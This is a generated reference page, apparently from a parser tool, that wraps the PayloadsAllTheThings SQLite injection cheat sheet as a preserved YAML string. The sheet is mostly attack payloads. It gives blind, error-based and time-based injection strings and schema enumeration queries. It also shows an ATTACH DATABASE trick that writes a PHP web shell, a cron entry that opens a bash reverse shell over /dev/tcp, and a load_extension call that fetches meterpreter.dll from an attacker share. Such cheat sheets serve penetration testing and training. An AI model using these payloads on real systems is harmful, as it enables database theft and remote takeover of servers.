---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# SQLite Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-sqlite-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/SQLite Injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SQLite Injection](../../topics/sql-injection/sqlite-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-sqlite-injection |
| name | SQLite Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md |

## Preserved Source Material

````yaml
_body: "# SQLite Injection\n\n> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert\
  \ or \"inject\" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user\
  \ inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate\
  \ the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.\n\
  \n## Summary\n\n* [SQLite Comments](#sqlite-comments)\n* [SQLite Enumeration](#sqlite-enumeration)\n* [SQLite String](#sqlite-string)\n\
  \    * [SQLite String Methodology](#sqlite-string-methodology)\n* [SQLite Blind](#sqlite-blind)\n    * [SQLite Blind Methodology](#sqlite-blind-methodology)\n\
  \    * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)\n* [SQlite Error Based](#sqlite-error-based)\n\
  * [SQlite Time Based](#sqlite-time-based)\n* [SQlite Remote Code Execution](#sqlite-remote-code-execution)\n    * [Attach\
  \ Database](#attach-database)\n    * [Load_extension](#load_extension)\n* [SQLite File Manipulation](#sqlite-file-manipulation)\n\
  \    * [SQLite Read File](#sqlite-read-file)\n    * [SQLite Write File](#sqlite-write-file)\n* [References](#references)\n\
  \n## SQLite Comments\n\n| Description         | Comment |\n| ------------------- | ------- |\n| Single-Line Comment | `--`\
  \    |\n| Multi-Line Comment  | `/**/`  |\n\n## SQLite Enumeration\n\n| Description   | SQL Query |\n| ------------- | -----------------------------------------\
  \ |\n| DBMS version  | `select sqlite_version();`                |\n\n## SQLite String\n\n### SQLite String Methodology\n\
  \n| Description             | SQL Query                                 |\n| ----------------------- | -----------------------------------------\
  \ |\n| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |\n| Extract Database Structure\
  \ (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |\n| Extract Table Name  | `SELECT tbl_name FROM sqlite_master\
  \ WHERE type='table'` |\n| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and\
  \ tbl_name NOT like 'sqlite_%'` |\n| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT\
  \ NULL AND name ='table_name'` |\n| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');`\
  \ |\n| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |\n| Extract Column Name\
  \ | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |\n\n## SQLite Blind\n\n### SQLite Blind Methodology\n\n| Description\
  \             | SQL Query                                 |\n| ----------------------- | -----------------------------------------\
  \ |\n| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE\
  \ 'sqlite_%' ) < number_of_table` |\n| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE\
  \ type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |\n| Extract Info          \
  \  | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT\
  \ 1 OFFSET 0) > HEX('some_char')` |\n| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master\
  \ WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2>\
  \ END` |\n\n### SQLite Blind With Substring Equivalent\n\n| Function    | Example                                   |\n\
  | ----------- | ----------------------------------------- |\n| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |\n\
  | `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |\n\n## SQlite Error Based\n\n```sql\nAND CASE WHEN [BOOLEAN_QUERY]\
  \ THEN 1 ELSE load_extension(1) END\n```\n\n## SQlite Time Based\n\n```sql\nAND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n\
  AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\n```\n\n## SQLite Remote Code Execution\n\n### Attach Database\n\
  \nThis snippet shows how an attacker could abuse SQLite's `ATTACH DATABASE` feature to plant a web-shell on a server:\n\n\
  ```sql\nATTACH DATABASE '/var/www/shell.php' AS shell;\nCREATE TABLE shell.pwn (dataz text);\nINSERT INTO shell.pwn (dataz)\
  \ VALUES ('<?php system($_GET[\"cmd\"]); ?>');--\n```\n\nFirst, it tells SQLite to \"treat\" a PHP file as a writable SQLite\
  \ database. Then it creates a table inside that file (which is actually the future web-shell). Finally it writes malicious\
  \ PHP code into the file.\n\n**Note:** Using `ATTACH DATABASE` to create a file comes with a drawback: SQLite will prepend\
  \ its magic header bytes (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, i.e., *\"SQLite format 3\"*). These bytes will corrupt\
  \ most server-side scripts, but PHP is unusually tolerant: as long as a `<?php` tag appears anywhere in the file, the interpreter\
  \ ignores any preceding garbage and executes the embedded code.\n\n```ps1\nfile shell.php  \nshell.php: SQLite 3.x database,\
  \ last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for\
  \ 2\n```\n\nIf uploading a PHP web shell isn’t possible but the service runs with root privileges, an attacker can use the\
  \ same technique to create a cron job that triggers a reverse shell:\n\n```sql\nATTACH DATABASE '/etc/cron.d/pwn.task' AS\
  \ cron;\nCREATE TABLE cron.tab (dataz text);\nINSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >&\
  \ /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--\n```\n\nThis writes a new cron entry that runs every minute and connects\
  \ back to the attacker.\n\n### Load_extension\n\n:warning: SQLite's ability to load external shared libraries (extensions)\
  \ is disabled by default in most environments. When enabled, SQLite can load a compiled module using the `load_extension()`\
  \ SQL function:\n\n```sql\nSELECT load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n```\n\nIn the\
  \ sqlite3 command-line shell you can display runtime configuration with:\n\n```sql\nsqlite> .dbconfig\n    load_extension\
  \ on\n```\n\nIf you see `load_extension on` (or off), that indicates whether the shell's runtime currently permits loading\
  \ shared-library extensions.\n\nA SQLite extension is simply a native shared library,typically a `.so` file on Linux or\
  \ a `.dll` file on Windows, that exposes a special initialization function. When the extension is loaded, SQLite calls this\
  \ function to register any new SQL functions, virtual tables, or other features provided by the module.\n\nTo compile a\
  \ loadable extension on Linux, you can use:\n\n```ps1\ngcc -g -fPIC -shared demo.c -o demo.so\n```\n\n## SQLite File Manipulation\n\
  \n### SQLite Read File\n\nSQLite does not support file I/O operations by default.\n\n### SQLite Write File\n\n```sql\nSELECT\
  \ writefile('/path/to/file', column_name) FROM table_name\n```\n\n## References\n\n* [Injecting SQLite database based application\
  \ - Manish Kishan Tanwar - February 14, 2017](https://web.archive.org/web/20211205031408/https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)\n\
  * [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://web.archive.org/web/20210221065923/http://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)\n\
  * [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)"
_relative_path: SQL Injection/SQLite Injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/SQLite Injection.md
````
